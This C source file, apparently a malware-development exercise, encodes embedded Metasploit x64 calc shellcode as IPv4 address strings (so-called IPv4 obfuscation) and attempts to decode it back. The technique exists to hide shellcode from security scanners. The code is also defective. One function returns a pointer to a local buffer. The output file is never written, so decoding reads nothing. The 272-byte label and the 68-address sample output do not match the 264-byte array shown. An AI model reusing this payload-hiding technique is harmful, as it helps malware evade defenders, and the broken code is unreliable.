#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// Disable error 4996 (caused by sprint)
// We dont supress bcoz if many fucntions are deprcated then each one will need to be supressed individually and disavle silences all at once.
#pragma warning (disable:4996)

#define MAX_IPS 100

char* GenerateIpv4(int a, int b, int c, int d) {
	unsigned char Output [32];

	// Creating the IPv4 address and saving it to the 'Output' variable 
	sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

	// Optional: Print the 'Output' variable to the console
	printf("[i] Output: %s\n", Output);

	return (char*)Output;
}

// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 4, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0){
		return FALSE;
	}
	FILE* fp = fopen("Encoded_output.txt", "w");
	if (!fp) {
		perror("[-] Failed to open file for writing");
		return FALSE;
	}

	printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));
	
	// We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 4.
	int c = 4, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
		if (c == 4) {
			counter++;

			// Generating the IPv4 address from 4 bytes which begin at i until [i + 3] 
			IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

			if (i == ShellcodeSize - 4) {
				// Printing the last IPv4 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv4 address
				printf("\"%s\", ", IP);
			}

			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 8 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	fclose(fp);
	return TRUE;
}

//Adding a function to decrypt back the output IPv4 address back to shellcode
int extract_ips(const char* filename, char ipList[MAX_IPS][16], int* ipCount) {
	FILE* fp = fopen(filename, "r");
	if (!fp) {
		perror("File Open Error");
		return -1;
	}
	char line[256];
	*ipCount = 0;
	while (fgets(line, sizeof(line), fp)) {
		int a, b, c, d;
		if (sscanf(line, "%d.%d.%d.%d", &a, &b, &c, &d) == 4) {
			snprintf(ipList[*ipCount], 16, "%d.%d.%d.%d", a, b, c, d);
			(*ipCount)++;
			if (*ipCount >= MAX_IPS) break;
		}
	}
	fclose(fp);
	return 0;
}

unsigned char* convert_ips(char ipList[MAX_IPS][16], int ipCount, size_t* shellcodeSize) {
	*shellcodeSize = ipCount * 4;
	unsigned char* shellcode = (unsigned char*)malloc(*shellcodeSize);
	if (!shellcode)return NULL;

	for (int i = 0; i < ipCount; i++) {
		uint8_t b1, b2, b3, b4;
		sscanf(ipList[i], "%hhu.%hhu.%hhu.%hhu", &b1, &b2, &b3, &b4);
		shellcode[i * 4 + 0] = b1;
		shellcode[i * 4 + 1] = b2;
		shellcode[i * 4 + 2] = b3;
		shellcode[i * 4 + 3] = b4;
	}
	return shellcode;
}

// x64 calc metasploit shellcode {272 bytes}
unsigned char rawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89
};

int main() {

	if (!GenerateIpv4Output(rawData, sizeof(rawData))) {
		// if failed, that is sizeof(rawData) isn't a multiple of 4 
		return -1;
	}

	//Auto-read from encoded output and reconstruct shellcode
	char ipList[MAX_IPS][16];
	int ipCount = 0;
	if (extract_ips("Encoded_output.txt", ipList, &ipCount) == 0) {
		size_t shellcodeSize = 0;
		unsigned char* reconstructed = convert_ips(ipList, ipCount, &shellcodeSize);
		if (reconstructed) {
			printf("\n[+] Reconstructed Shellcode (%zu bytes):\n", shellcodeSize);
				for(size_t i = 0; i < shellcodeSize; i++) {
					printf("\\x%02X", reconstructed[i]);
			}
			printf("\n");
			free(reconstructed);
		}
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}

/*
output :

char* Ipv4Array[68] = {
		"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82",
		"32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237",
		"82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
		"139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193",
		"56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73",
		"1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
		"89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",
		"111.135.255.213", "187.224.29.42", "10.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71",
		"19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.0"
};
*/